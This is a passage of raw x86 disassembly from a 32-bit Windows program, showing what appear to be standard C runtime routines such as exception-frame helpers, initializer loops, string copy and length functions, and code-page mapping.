  423755:	pop    edi
  423756:	pop    esi
  423757:	pop    ebp
  423758:	pop    ebx
  423759:	add    esp,0x48
  42375c:	ret    
  42375d:	push   0xc
  42375f:	push   0x4284f0
  423764:	call   0x423950
  423769:	mov    DWORD PTR [ebp-0x1c],0x428f48
  423770:	cmp    DWORD PTR [ebp-0x1c],0x428f48
  423777:	jae    0x42379b
  423779:	and    DWORD PTR [ebp-0x4],0x0
  42377d:	mov    eax,DWORD PTR [ebp-0x1c]
  423780:	mov    eax,DWORD PTR [eax]
  423782:	test   eax,eax
  423784:	je     0x423791
  423786:	call   eax
  423788:	jmp    0x423791
  42378a:	xor    eax,eax
  42378c:	inc    eax
  42378d:	ret    
  42378e:	mov    esp,DWORD PTR [ebp-0x18]
  423791:	or     DWORD PTR [ebp-0x4],0xffffffff
  423795:	add    DWORD PTR [ebp-0x1c],0x4
  423799:	jmp    0x423770
  42379b:	call   0x42398b
  4237a0:	ret    
  4237a1:	push   0xc
  4237a3:	push   0x428500
  4237a8:	call   0x423950
  4237ad:	mov    DWORD PTR [ebp-0x1c],0x428f50
  4237b4:	cmp    DWORD PTR [ebp-0x1c],0x428f50
  4237bb:	jae    0x4237df
  4237bd:	and    DWORD PTR [ebp-0x4],0x0
  4237c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4237c4:	mov    eax,DWORD PTR [eax]
  4237c6:	test   eax,eax
  4237c8:	je     0x4237d5
  4237ca:	call   eax
  4237cc:	jmp    0x4237d5
  4237ce:	xor    eax,eax
  4237d0:	inc    eax
  4237d1:	ret    
  4237d2:	mov    esp,DWORD PTR [ebp-0x18]
  4237d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4237d9:	add    DWORD PTR [ebp-0x1c],0x4
  4237dd:	jmp    0x4237b4
  4237df:	call   0x42398b
  4237e4:	ret    
  4237e5:	call   0x423a26
  4237ea:	mov    eax,ds:0x46552c
  4237ef:	cmp    eax,0xffffffff
  4237f2:	je     0x423802
  4237f4:	push   eax
  4237f5:	call   DWORD PTR ds:0x4280a4
  4237fb:	or     DWORD PTR ds:0x46552c,0xffffffff
  423802:	ret    
  423803:	push   ebx
  423804:	push   esi
  423805:	call   DWORD PTR ds:0x42803c
  42380b:	push   DWORD PTR ds:0x46552c
  423811:	mov    ebx,eax
  423813:	call   DWORD PTR ds:0x4280b0
  423819:	mov    esi,eax
  42381b:	test   esi,esi
  42381d:	jne    0x423868
  42381f:	push   0x88
  423824:	push   0x1
  423826:	call   0x424a68
  42382b:	mov    esi,eax
  42382d:	test   esi,esi
  42382f:	pop    ecx
  423830:	pop    ecx
  423831:	je     0x423860
  423833:	push   esi
  423834:	push   DWORD PTR ds:0x46552c
  42383a:	call   DWORD PTR ds:0x4280ac
  423840:	test   eax,eax
  423842:	je     0x423860
  423844:	mov    DWORD PTR [esi+0x54],0x465480
  42384b:	mov    DWORD PTR [esi+0x14],0x1
  423852:	call   DWORD PTR ds:0x428020
  423858:	or     DWORD PTR [esi+0x4],0xffffffff
  42385c:	mov    DWORD PTR [esi],eax
  42385e:	jmp    0x423868
  423860:	push   0x10
  423862:	call   0x422a16
  423867:	pop    ecx
  423868:	push   ebx
  423869:	call   DWORD PTR ds:0x4280a8
  42386f:	mov    eax,esi
  423871:	pop    esi
  423872:	pop    ebx
  423873:	ret    
  423874:	call   0x4239dd
  423879:	test   eax,eax
  42387b:	je     0x42388d
  42387d:	call   DWORD PTR ds:0x4280b4
  423883:	cmp    eax,0xffffffff
  423886:	mov    ds:0x46552c,eax
  42388b:	jne    0x423895
  42388d:	call   0x4237e5
  423892:	xor    eax,eax
  423894:	ret    
  423895:	push   esi
  423896:	push   0x88
  42389b:	push   0x1
  42389d:	call   0x424a68
  4238a2:	mov    esi,eax
  4238a4:	test   esi,esi
  4238a6:	pop    ecx
  4238a7:	pop    ecx
  4238a8:	je     0x4238da
  4238aa:	push   esi
  4238ab:	push   DWORD PTR ds:0x46552c
  4238b1:	call   DWORD PTR ds:0x4280ac
  4238b7:	test   eax,eax
  4238b9:	je     0x4238da
  4238bb:	mov    DWORD PTR [esi+0x54],0x465480
  4238c2:	mov    DWORD PTR [esi+0x14],0x1
  4238c9:	call   DWORD PTR ds:0x428020
  4238cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4238d3:	mov    DWORD PTR [esi],eax
  4238d5:	xor    eax,eax
  4238d7:	inc    eax
  4238d8:	pop    esi
  4238d9:	ret    
  4238da:	call   0x4237e5
  4238df:	xor    eax,eax
  4238e1:	pop    esi
  4238e2:	ret    
  4238e3:	cmp    DWORD PTR ds:0x465d04,0x2
  4238ea:	jne    0x4238f9
  4238ec:	cmp    DWORD PTR ds:0x465d10,0x5
  4238f3:	jb     0x4238f9
  4238f5:	xor    eax,eax
  4238f7:	inc    eax
  4238f8:	ret    
  4238f9:	push   0x3
  4238fb:	pop    eax
  4238fc:	ret    
  4238fd:	xor    eax,eax
  4238ff:	cmp    DWORD PTR [esp+0x4],eax
  423903:	push   0x0
  423905:	sete   al
  423908:	push   0x1000
  42390d:	push   eax
  42390e:	call   DWORD PTR ds:0x4280bc
  423914:	test   eax,eax
  423916:	mov    ds:0x466380,eax
  42391b:	je     0x423947
  42391d:	call   0x4238e3
  423922:	cmp    eax,0x3
  423925:	mov    ds:0x466384,eax
  42392a:	jne    0x42394a
  42392c:	push   0x3f8
  423931:	call   0x424cea
  423936:	test   eax,eax
  423938:	pop    ecx
  423939:	jne    0x42394a
  42393b:	push   DWORD PTR ds:0x466380
  423941:	call   DWORD PTR ds:0x4280b8
  423947:	xor    eax,eax
  423949:	ret    
  42394a:	xor    eax,eax
  42394c:	inc    eax
  42394d:	ret    
  42394e:	int3   
  42394f:	int3   
  423950:	push   0x425818
  423955:	mov    eax,fs:0x0
  42395b:	push   eax
  42395c:	mov    eax,DWORD PTR [esp+0x10]
  423960:	mov    DWORD PTR [esp+0x10],ebp
  423964:	lea    ebp,[esp+0x10]
  423968:	sub    esp,eax
  42396a:	push   ebx
  42396b:	push   esi
  42396c:	push   edi
  42396d:	mov    eax,DWORD PTR [ebp-0x8]
  423970:	mov    DWORD PTR [ebp-0x18],esp
  423973:	push   eax
  423974:	mov    eax,DWORD PTR [ebp-0x4]
  423977:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42397e:	mov    DWORD PTR [ebp-0x8],eax
  423981:	lea    eax,[ebp-0x10]
  423984:	mov    fs:0x0,eax
  42398a:	ret    
  42398b:	mov    ecx,DWORD PTR [ebp-0x10]
  42398e:	mov    DWORD PTR fs:0x0,ecx
  423995:	pop    ecx
  423996:	pop    edi
  423997:	pop    esi
  423998:	pop    ebx
  423999:	leave  
  42399a:	push   ecx
  42399b:	ret    
  42399c:	int3   
  42399d:	int3   
  42399e:	int3   
  42399f:	int3   
  4239a0:	cmp    eax,0x1000
  4239a5:	jae    0x4239b5
  4239a7:	neg    eax
  4239a9:	add    eax,esp
  4239ab:	add    eax,0x4
  4239ae:	test   DWORD PTR [eax],eax
  4239b0:	xchg   esp,eax
  4239b1:	mov    eax,DWORD PTR [eax]
  4239b3:	push   eax
  4239b4:	ret    
  4239b5:	push   ecx
  4239b6:	lea    ecx,[esp+0x8]
  4239ba:	sub    ecx,0x1000
  4239c0:	sub    eax,0x1000
  4239c5:	test   DWORD PTR [ecx],eax
  4239c7:	cmp    eax,0x1000
  4239cc:	jae    0x4239ba
  4239ce:	sub    ecx,eax
  4239d0:	mov    eax,esp
  4239d2:	test   DWORD PTR [ecx],eax
  4239d4:	mov    esp,ecx
  4239d6:	mov    ecx,DWORD PTR [eax]
  4239d8:	mov    eax,DWORD PTR [eax+0x4]
  4239db:	push   eax
  4239dc:	ret    
  4239dd:	push   esi
  4239de:	push   edi
  4239df:	xor    esi,esi
  4239e1:	mov    edi,0x465e60
  4239e6:	cmp    DWORD PTR [esi*8+0x465544],0x1
  4239ee:	jne    0x423a0e
  4239f0:	lea    eax,[esi*8+0x465540]
  4239f7:	mov    DWORD PTR [eax],edi
  4239f9:	push   0xfa0
  4239fe:	push   DWORD PTR [eax]
  423a00:	add    edi,0x18
  423a03:	call   0x4249dd
  423a08:	test   eax,eax
  423a0a:	pop    ecx
  423a0b:	pop    ecx
  423a0c:	je     0x423a1a
  423a0e:	inc    esi
  423a0f:	cmp    esi,0x24
  423a12:	jl     0x4239e6
  423a14:	xor    eax,eax
  423a16:	inc    eax
  423a17:	pop    edi
  423a18:	pop    esi
  423a19:	ret    
  423a1a:	and    DWORD PTR [esi*8+0x465540],0x0
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a17
  423a26:	push   ebx
  423a27:	mov    ebx,DWORD PTR ds:0x4280a0
  423a2d:	push   esi
  423a2e:	mov    esi,0x465540
  423a33:	push   edi
  423a34:	mov    edi,DWORD PTR [esi]
  423a36:	test   edi,edi
  423a38:	je     0x423a4d
  423a3a:	cmp    DWORD PTR [esi+0x4],0x1
  423a3e:	je     0x423a4d
  423a40:	push   edi
  423a41:	call   ebx
  423a43:	push   edi
  423a44:	call   0x42455a
  423a49:	and    DWORD PTR [esi],0x0
  423a4c:	pop    ecx
  423a4d:	add    esi,0x8
  423a50:	cmp    esi,0x465660
  423a56:	jl     0x423a34
  423a58:	mov    esi,0x465540
  423a5d:	pop    edi
  423a5e:	mov    eax,DWORD PTR [esi]
  423a60:	test   eax,eax
  423a62:	je     0x423a6d
  423a64:	cmp    DWORD PTR [esi+0x4],0x1
  423a68:	jne    0x423a6d
  423a6a:	push   eax
  423a6b:	call   ebx
  423a6d:	add    esi,0x8
  423a70:	cmp    esi,0x465660
  423a76:	jl     0x423a5e
  423a78:	pop    esi
  423a79:	pop    ebx
  423a7a:	ret    
  423a7b:	push   ebp
  423a7c:	mov    ebp,esp
  423a7e:	mov    eax,DWORD PTR [ebp+0x8]
  423a81:	push   DWORD PTR [eax*8+0x465540]
  423a88:	call   DWORD PTR ds:0x4280c8
  423a8e:	pop    ebp
  423a8f:	ret    
  423a90:	push   ebp
  423a91:	mov    ebp,esp
  423a93:	push   esi
  423a94:	mov    esi,DWORD PTR [ebp+0x8]
  423a97:	lea    esi,[esi*8+0x465540]
  423a9e:	cmp    DWORD PTR [esi],0x0
  423aa1:	je     0x423aa8
  423aa3:	xor    eax,eax
  423aa5:	inc    eax
  423aa6:	jmp    0x423b0c
  423aa8:	push   edi
  423aa9:	push   0x18
  423aab:	call   0x424672
  423ab0:	mov    edi,eax
  423ab2:	test   edi,edi
  423ab4:	pop    ecx
  423ab5:	jne    0x423ac6
  423ab7:	call   0x4258f0
  423abc:	mov    DWORD PTR [eax],0xc
  423ac2:	xor    eax,eax
  423ac4:	jmp    0x423b0b
  423ac6:	push   0xa
  423ac8:	call   0x423b0f
  423acd:	cmp    DWORD PTR [esi],0x0
  423ad0:	pop    ecx
  423ad1:	jne    0x423af9
  423ad3:	push   0xfa0
  423ad8:	push   edi
  423ad9:	call   0x4249dd
  423ade:	test   eax,eax
  423ae0:	pop    ecx
  423ae1:	pop    ecx
  423ae2:	jne    0x423af5
  423ae4:	push   edi
  423ae5:	call   0x42455a
  423aea:	push   0xa
  423aec:	call   0x423a7b
  423af1:	pop    ecx
  423af2:	pop    ecx
  423af3:	jmp    0x423ab7
  423af5:	mov    DWORD PTR [esi],edi
  423af7:	jmp    0x423b00
  423af9:	push   edi
  423afa:	call   0x42455a
  423aff:	pop    ecx
  423b00:	push   0xa
  423b02:	call   0x423a7b
  423b07:	xor    eax,eax
  423b09:	pop    ecx
  423b0a:	inc    eax
  423b0b:	pop    edi
  423b0c:	pop    esi
  423b0d:	pop    ebp
  423b0e:	ret    
  423b0f:	push   ebp
  423b10:	mov    ebp,esp
  423b12:	mov    eax,DWORD PTR [ebp+0x8]
  423b15:	push   esi
  423b16:	lea    esi,[eax*8+0x465540]
  423b1d:	cmp    DWORD PTR [esi],0x0
  423b20:	jne    0x423b35
  423b22:	push   eax
  423b23:	call   0x423a90
  423b28:	test   eax,eax
  423b2a:	pop    ecx
  423b2b:	jne    0x423b35
  423b2d:	push   0x11
  423b2f:	call   0x422a16
  423b34:	pop    ecx
  423b35:	push   DWORD PTR [esi]
  423b37:	call   DWORD PTR ds:0x4280cc
  423b3d:	pop    esi
  423b3e:	pop    ebp
  423b3f:	ret    
  423b40:	push   esi
  423b41:	push   DWORD PTR ds:0x4664a8
  423b47:	call   0x425aa6
  423b4c:	pop    ecx
  423b4d:	mov    ecx,DWORD PTR ds:0x4664a4
  423b53:	mov    esi,eax
  423b55:	mov    eax,ds:0x4664a8
  423b5a:	mov    edx,ecx
  423b5c:	sub    edx,eax
  423b5e:	add    edx,0x4
  423b61:	cmp    esi,edx
  423b63:	jae    0x423bb3
  423b65:	mov    ecx,0x800
  423b6a:	cmp    esi,ecx
  423b6c:	jae    0x423b70
  423b6e:	mov    ecx,esi
  423b70:	add    ecx,esi
  423b72:	push   ecx
  423b73:	push   eax
  423b74:	call   0x4258f9
  423b79:	test   eax,eax
  423b7b:	pop    ecx
  423b7c:	pop    ecx
  423b7d:	jne    0x423b96
  423b7f:	add    esi,0x10
  423b82:	push   esi
  423b83:	push   DWORD PTR ds:0x4664a8
  423b89:	call   0x4258f9
  423b8e:	test   eax,eax
  423b90:	pop    ecx
  423b91:	pop    ecx
  423b92:	jne    0x423b96
  423b94:	pop    esi
  423b95:	ret    
  423b96:	mov    ecx,DWORD PTR ds:0x4664a4
  423b9c:	sub    ecx,DWORD PTR ds:0x4664a8
  423ba2:	mov    ds:0x4664a8,eax
  423ba7:	sar    ecx,0x2
  423baa:	lea    ecx,[eax+ecx*4]
  423bad:	mov    DWORD PTR ds:0x4664a4,ecx
  423bb3:	mov    DWORD PTR [ecx],edi
  423bb5:	add    DWORD PTR ds:0x4664a4,0x4
  423bbc:	mov    eax,edi
  423bbe:	pop    esi
  423bbf:	ret    
  423bc0:	push   0x80
  423bc5:	call   0x424672
  423bca:	test   eax,eax
  423bcc:	pop    ecx
  423bcd:	mov    ds:0x4664a8,eax
  423bd2:	jne    0x423bd8
  423bd4:	push   0x18
  423bd6:	pop    eax
  423bd7:	ret    
  423bd8:	and    DWORD PTR [eax],0x0
  423bdb:	mov    eax,ds:0x4664a8
  423be0:	mov    ds:0x4664a4,eax
  423be5:	xor    eax,eax
  423be7:	ret    
  423be8:	push   0xc
  423bea:	push   0x428510
  423bef:	call   0x423950
  423bf4:	call   0x422c61
  423bf9:	and    DWORD PTR [ebp-0x4],0x0
  423bfd:	mov    edi,DWORD PTR [ebp+0x8]
  423c00:	call   0x423b40
  423c05:	mov    DWORD PTR [ebp-0x1c],eax
  423c08:	or     DWORD PTR [ebp-0x4],0xffffffff
  423c0c:	call   0x423c1a
  423c11:	mov    eax,DWORD PTR [ebp-0x1c]
  423c14:	call   0x42398b
  423c19:	ret    
  423c1a:	call   0x422c6a
  423c1f:	ret    
  423c20:	push   DWORD PTR [esp+0x4]
  423c24:	call   0x423be8
  423c29:	neg    eax
  423c2b:	sbb    eax,eax
  423c2d:	neg    eax
  423c2f:	pop    ecx
  423c30:	dec    eax
  423c31:	ret    
  423c32:	push   ebp
  423c33:	mov    ebp,esp
  423c35:	sub    esp,0x10
  423c38:	push   ebx
  423c39:	xor    ebx,ebx
  423c3b:	cmp    DWORD PTR ds:0x465fb0,ebx
  423c41:	push   esi
  423c42:	push   edi
  423c43:	jne    0x423cb2
  423c45:	push   0x428580
  423c4a:	call   DWORD PTR ds:0x4280d0
  423c50:	mov    edi,eax
  423c52:	cmp    edi,ebx
  423c54:	je     0x423ced
  423c5a:	mov    esi,DWORD PTR ds:0x428040
  423c60:	push   0x428574
  423c65:	push   edi
  423c66:	call   esi
  423c68:	test   eax,eax
  423c6a:	mov    ds:0x465fb0,eax
  423c6f:	je     0x423ced
  423c71:	push   0x428564
  423c76:	push   edi
  423c77:	call   esi
  423c79:	push   0x428550
  423c7e:	push   edi
  423c7f:	mov    ds:0x465fb4,eax
  423c84:	call   esi
  423c86:	cmp    DWORD PTR ds:0x465d04,0x2
  423c8d:	mov    ds:0x465fb8,eax
  423c92:	jne    0x423cb2
  423c94:	push   0x428534
  423c99:	push   edi
  423c9a:	call   esi
  423c9c:	test   eax,eax
  423c9e:	mov    ds:0x465fc0,eax
  423ca3:	je     0x423cb2
  423ca5:	push   0x42851c
  423caa:	push   edi
  423cab:	call   esi
  423cad:	mov    ds:0x465fbc,eax
  423cb2:	mov    eax,ds:0x465fbc
  423cb7:	test   eax,eax
  423cb9:	je     0x423cf7
  423cbb:	call   eax
  423cbd:	test   eax,eax
  423cbf:	je     0x423cde
  423cc1:	lea    ecx,[ebp-0x4]
  423cc4:	push   ecx
  423cc5:	push   0xc
  423cc7:	lea    ecx,[ebp-0x10]
  423cca:	push   ecx
  423ccb:	push   0x1
  423ccd:	push   eax
  423cce:	call   DWORD PTR ds:0x465fc0
  423cd4:	test   eax,eax
  423cd6:	je     0x423cde
  423cd8:	test   BYTE PTR [ebp-0x8],0x1
  423cdc:	jne    0x423cf7
  423cde:	cmp    DWORD PTR ds:0x465d10,0x4
  423ce5:	jb     0x423cf1
  423ce7:	or     BYTE PTR [ebp+0x12],0x20
  423ceb:	jmp    0x423d16
  423ced:	xor    eax,eax
  423cef:	jmp    0x423d26
  423cf1:	or     BYTE PTR [ebp+0x12],0x4
  423cf5:	jmp    0x423d16
  423cf7:	mov    eax,ds:0x465fb4
  423cfc:	test   eax,eax
  423cfe:	je     0x423d16
  423d00:	call   eax
  423d02:	mov    ebx,eax
  423d04:	test   ebx,ebx
  423d06:	je     0x423d16
  423d08:	mov    eax,ds:0x465fb8
  423d0d:	test   eax,eax
  423d0f:	je     0x423d16
  423d11:	push   ebx
  423d12:	call   eax
  423d14:	mov    ebx,eax
  423d16:	push   DWORD PTR [ebp+0x10]
  423d19:	push   DWORD PTR [ebp+0xc]
  423d1c:	push   DWORD PTR [ebp+0x8]
  423d1f:	push   ebx
  423d20:	call   DWORD PTR ds:0x465fb0
  423d26:	pop    edi
  423d27:	pop    esi
  423d28:	pop    ebx
  423d29:	leave  
  423d2a:	ret    
  423d2b:	int3   
  423d2c:	int3   
  423d2d:	int3   
  423d2e:	int3   
  423d2f:	int3   
  423d30:	push   edi
  423d31:	mov    edi,DWORD PTR [esp+0x8]
  423d35:	jmp    0x423da5
  423d37:	lea    esp,[esp+0x0]
  423d3e:	mov    edi,edi
  423d40:	mov    ecx,DWORD PTR [esp+0x4]
  423d44:	push   edi
  423d45:	test   ecx,0x3
  423d4b:	je     0x423d60
  423d4d:	mov    al,BYTE PTR [ecx]
  423d4f:	add    ecx,0x1
  423d52:	test   al,al
  423d54:	je     0x423d93
  423d56:	test   ecx,0x3
  423d5c:	jne    0x423d4d
  423d5e:	mov    edi,edi
  423d60:	mov    eax,DWORD PTR [ecx]
  423d62:	mov    edx,0x7efefeff
  423d67:	add    edx,eax
  423d69:	xor    eax,0xffffffff
  423d6c:	xor    eax,edx
  423d6e:	add    ecx,0x4
  423d71:	test   eax,0x81010100
  423d76:	je     0x423d60
  423d78:	mov    eax,DWORD PTR [ecx-0x4]
  423d7b:	test   al,al
  423d7d:	je     0x423da2
  423d7f:	test   ah,ah
  423d81:	je     0x423d9d
  423d83:	test   eax,0xff0000
  423d88:	je     0x423d98
  423d8a:	test   eax,0xff000000
  423d8f:	je     0x423d93
  423d91:	jmp    0x423d60
  423d93:	lea    edi,[ecx-0x1]
  423d96:	jmp    0x423da5
  423d98:	lea    edi,[ecx-0x2]
  423d9b:	jmp    0x423da5
  423d9d:	lea    edi,[ecx-0x3]
  423da0:	jmp    0x423da5
  423da2:	lea    edi,[ecx-0x4]
  423da5:	mov    ecx,DWORD PTR [esp+0xc]
  423da9:	test   ecx,0x3
  423daf:	je     0x423dce
  423db1:	mov    dl,BYTE PTR [ecx]
  423db3:	add    ecx,0x1
  423db6:	test   dl,dl
  423db8:	je     0x423e20
  423dba:	mov    BYTE PTR [edi],dl
  423dbc:	add    edi,0x1
  423dbf:	test   ecx,0x3
  423dc5:	jne    0x423db1
  423dc7:	jmp    0x423dce
  423dc9:	mov    DWORD PTR [edi],edx
  423dcb:	add    edi,0x4
  423dce:	mov    edx,0x7efefeff
  423dd3:	mov    eax,DWORD PTR [ecx]
  423dd5:	add    edx,eax
  423dd7:	xor    eax,0xffffffff
  423dda:	xor    eax,edx
  423ddc:	mov    edx,DWORD PTR [ecx]
  423dde:	add    ecx,0x4
  423de1:	test   eax,0x81010100
  423de6:	je     0x423dc9
  423de8:	test   dl,dl
  423dea:	je     0x423e20
  423dec:	test   dh,dh
  423dee:	je     0x423e17
  423df0:	test   edx,0xff0000
  423df6:	je     0x423e0a
  423df8:	test   edx,0xff000000
  423dfe:	je     0x423e02
  423e00:	jmp    0x423dc9
  423e02:	mov    DWORD PTR [edi],edx
  423e04:	mov    eax,DWORD PTR [esp+0x8]
  423e08:	pop    edi
  423e09:	ret    
  423e0a:	mov    WORD PTR [edi],dx
  423e0d:	mov    eax,DWORD PTR [esp+0x8]
  423e11:	mov    BYTE PTR [edi+0x2],0x0
  423e15:	pop    edi
  423e16:	ret    
  423e17:	mov    WORD PTR [edi],dx
  423e1a:	mov    eax,DWORD PTR [esp+0x8]
  423e1e:	pop    edi
  423e1f:	ret    
  423e20:	mov    BYTE PTR [edi],dl
  423e22:	mov    eax,DWORD PTR [esp+0x8]
  423e26:	pop    edi
  423e27:	ret    
  423e28:	int3   
  423e29:	int3   
  423e2a:	int3   
  423e2b:	int3   
  423e2c:	int3   
  423e2d:	int3   
  423e2e:	int3   
  423e2f:	int3   
  423e30:	mov    ecx,DWORD PTR [esp+0xc]
  423e34:	push   edi
  423e35:	test   ecx,ecx
  423e37:	je     0x423ecf
  423e3d:	push   esi
  423e3e:	push   ebx
  423e3f:	mov    ebx,ecx
  423e41:	mov    esi,DWORD PTR [esp+0x14]
  423e45:	test   esi,0x3
  423e4b:	mov    edi,DWORD PTR [esp+0x10]
  423e4f:	jne    0x423e5c
  423e51:	shr    ecx,0x2
  423e54:	jne    0x423edf
  423e5a:	jmp    0x423e83
  423e5c:	mov    al,BYTE PTR [esi]
  423e5e:	add    esi,0x1
  423e61:	mov    BYTE PTR [edi],al
  423e63:	add    edi,0x1
  423e66:	sub    ecx,0x1
  423e69:	je     0x423e96
  423e6b:	test   al,al
  423e6d:	je     0x423e9e
  423e6f:	test   esi,0x3
  423e75:	jne    0x423e5c
  423e77:	mov    ebx,ecx
  423e79:	shr    ecx,0x2
  423e7c:	jne    0x423edf
  423e7e:	and    ebx,0x3
  423e81:	je     0x423e96
  423e83:	mov    al,BYTE PTR [esi]
  423e85:	add    esi,0x1
  423e88:	mov    BYTE PTR [edi],al
  423e8a:	add    edi,0x1
  423e8d:	test   al,al
  423e8f:	je     0x423ec8
  423e91:	sub    ebx,0x1
  423e94:	jne    0x423e83
  423e96:	mov    eax,DWORD PTR [esp+0x10]
  423e9a:	pop    ebx
  423e9b:	pop    esi
  423e9c:	pop    edi
  423e9d:	ret    
  423e9e:	test   edi,0x3
  423ea4:	je     0x423ebc
  423ea6:	mov    BYTE PTR [edi],al
  423ea8:	add    edi,0x1
  423eab:	sub    ecx,0x1
  423eae:	je     0x423f4c
  423eb4:	test   edi,0x3
  423eba:	jne    0x423ea6
  423ebc:	mov    ebx,ecx
  423ebe:	shr    ecx,0x2
  423ec1:	jne    0x423f37
  423ec3:	mov    BYTE PTR [edi],al
  423ec5:	add    edi,0x1
  423ec8:	sub    ebx,0x1
  423ecb:	jne    0x423ec3
  423ecd:	pop    ebx
  423ece:	pop    esi
  423ecf:	mov    eax,DWORD PTR [esp+0x8]
  423ed3:	pop    edi
  423ed4:	ret    
  423ed5:	mov    DWORD PTR [edi],edx
  423ed7:	add    edi,0x4
  423eda:	sub    ecx,0x1
  423edd:	je     0x423e7e
  423edf:	mov    edx,0x7efefeff
  423ee4:	mov    eax,DWORD PTR [esi]
  423ee6:	add    edx,eax
  423ee8:	xor    eax,0xffffffff
  423eeb:	xor    eax,edx
  423eed:	mov    edx,DWORD PTR [esi]
  423eef:	add    esi,0x4
  423ef2:	test   eax,0x81010100
  423ef7:	je     0x423ed5
  423ef9:	test   dl,dl
  423efb:	je     0x423f29
  423efd:	test   dh,dh
  423eff:	je     0x423f1f
  423f01:	test   edx,0xff0000
  423f07:	je     0x423f15
  423f09:	test   edx,0xff000000
  423f0f:	jne    0x423ed5
  423f11:	mov    DWORD PTR [edi],edx
  423f13:	jmp    0x423f2d
  423f15:	and    edx,0xffff
  423f1b:	mov    DWORD PTR [edi],edx
  423f1d:	jmp    0x423f2d
  423f1f:	and    edx,0xff
  423f25:	mov    DWORD PTR [edi],edx
  423f27:	jmp    0x423f2d
  423f29:	xor    edx,edx
  423f2b:	mov    DWORD PTR [edi],edx
  423f2d:	add    edi,0x4
  423f30:	xor    eax,eax
  423f32:	sub    ecx,0x1
  423f35:	je     0x423f43
  423f37:	xor    eax,eax
  423f39:	mov    DWORD PTR [edi],eax
  423f3b:	add    edi,0x4
  423f3e:	sub    ecx,0x1
  423f41:	jne    0x423f39
  423f43:	and    ebx,0x3
  423f46:	jne    0x423ec3
  423f4c:	mov    eax,DWORD PTR [esp+0x10]
  423f50:	pop    ebx
  423f51:	pop    esi
  423f52:	pop    edi
  423f53:	ret    
  423f54:	int3   
  423f55:	int3   
  423f56:	int3   
  423f57:	int3   
  423f58:	int3   
  423f59:	int3   
  423f5a:	int3   
  423f5b:	int3   
  423f5c:	int3   
  423f5d:	int3   
  423f5e:	int3   
  423f5f:	int3   
  423f60:	mov    ecx,DWORD PTR [esp+0x4]
  423f64:	test   ecx,0x3
  423f6a:	je     0x423f90
  423f6c:	mov    al,BYTE PTR [ecx]
  423f6e:	add    ecx,0x1
  423f71:	test   al,al
  423f73:	je     0x423fc3
  423f75:	test   ecx,0x3
  423f7b:	jne    0x423f6c
  423f7d:	add    eax,0x0
  423f82:	lea    esp,[esp+0x0]
  423f89:	lea    esp,[esp+0x0]
  423f90:	mov    eax,DWORD PTR [ecx]
  423f92:	mov    edx,0x7efefeff
  423f97:	add    edx,eax
  423f99:	xor    eax,0xffffffff
  423f9c:	xor    eax,edx
  423f9e:	add    ecx,0x4
  423fa1:	test   eax,0x81010100
  423fa6:	je     0x423f90
  423fa8:	mov    eax,DWORD PTR [ecx-0x4]
  423fab:	test   al,al
  423fad:	je     0x423fe1
  423faf:	test   ah,ah
  423fb1:	je     0x423fd7
  423fb3:	test   eax,0xff0000
  423fb8:	je     0x423fcd
  423fba:	test   eax,0xff000000
  423fbf:	je     0x423fc3
  423fc1:	jmp    0x423f90
  423fc3:	lea    eax,[ecx-0x1]
  423fc6:	mov    ecx,DWORD PTR [esp+0x4]
  423fca:	sub    eax,ecx
  423fcc:	ret    
  423fcd:	lea    eax,[ecx-0x2]
  423fd0:	mov    ecx,DWORD PTR [esp+0x4]
  423fd4:	sub    eax,ecx
  423fd6:	ret    
  423fd7:	lea    eax,[ecx-0x3]
  423fda:	mov    ecx,DWORD PTR [esp+0x4]
  423fde:	sub    eax,ecx
  423fe0:	ret    
  423fe1:	lea    eax,[ecx-0x4]
  423fe4:	mov    ecx,DWORD PTR [esp+0x4]
  423fe8:	sub    eax,ecx
  423fea:	ret    
  423feb:	push   0x8
  423fed:	push   0x428590
  423ff2:	call   0x423950
  423ff7:	and    DWORD PTR [ebp-0x4],0x0
  423ffb:	push   0x0
  423ffd:	push   0x1
  423fff:	call   0x425b72
  424004:	pop    ecx
  424005:	pop    ecx
  424006:	jmp    0x42400f
  424008:	xor    eax,eax
  42400a:	inc    eax
  42400b:	ret    
  42400c:	mov    esp,DWORD PTR [ebp-0x18]
  42400f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424013:	push   0x3
  424015:	call   DWORD PTR ds:0x428068
  42401b:	int3   
  42401c:	cmp    ecx,DWORD PTR ds:0x465660
  424022:	jne    0x424025
  424024:	ret    
  424025:	jmp    0x423feb
  42402a:	movzx  eax,BYTE PTR [esp+0x4]
  42402f:	mov    cl,BYTE PTR [esp+0xc]
  424033:	test   BYTE PTR [eax+0x466161],cl
  424039:	jne    0x424057
  42403b:	cmp    DWORD PTR [esp+0x8],0x0
  424040:	je     0x424050
  424042:	movzx  eax,WORD PTR [eax*2+0x42898a]
  42404a:	and    eax,DWORD PTR [esp+0x8]
  42404e:	jmp    0x424052
  424050:	xor    eax,eax
  424052:	test   eax,eax
  424054:	jne    0x424057
  424056:	ret    
  424057:	xor    eax,eax
  424059:	inc    eax
  42405a:	ret    
  42405b:	push   0x4
  42405d:	push   0x0
  42405f:	push   DWORD PTR [esp+0xc]
  424063:	call   0x42402a
  424068:	add    esp,0xc
  42406b:	ret    
  42406c:	sub    eax,0x3a4
  424071:	je     0x424095
  424073:	sub    eax,0x4
  424076:	je     0x42408f
  424078:	sub    eax,0xd
  42407b:	je     0x424089
  42407d:	dec    eax
  42407e:	je     0x424083
  424080:	xor    eax,eax
  424082:	ret    
  424083:	mov    eax,0x404
  424088:	ret    
  424089:	mov    eax,0x412
  42408e:	ret    
  42408f:	mov    eax,0x804
  424094:	ret    
  424095:	mov    eax,0x411
  42409a:	ret    
  42409b:	push   edi
  42409c:	push   0x40
  42409e:	xor    eax,eax
  4240a0:	pop    ecx
  4240a1:	mov    edi,0x466160
  4240a6:	rep stos DWORD PTR es:[edi],eax
  4240a8:	stos   BYTE PTR es:[edi],al
  4240a9:	xor    eax,eax
  4240ab:	mov    ds:0x466264,eax
  4240b0:	mov    ds:0x46615c,eax
  4240b5:	mov    ds:0x466154,eax
  4240ba:	mov    edi,0x466270
  4240bf:	stos   DWORD PTR es:[edi],eax
  4240c0:	stos   DWORD PTR es:[edi],eax
  4240c1:	stos   DWORD PTR es:[edi],eax
  4240c2:	pop    edi
  4240c3:	ret    
  4240c4:	push   ebp
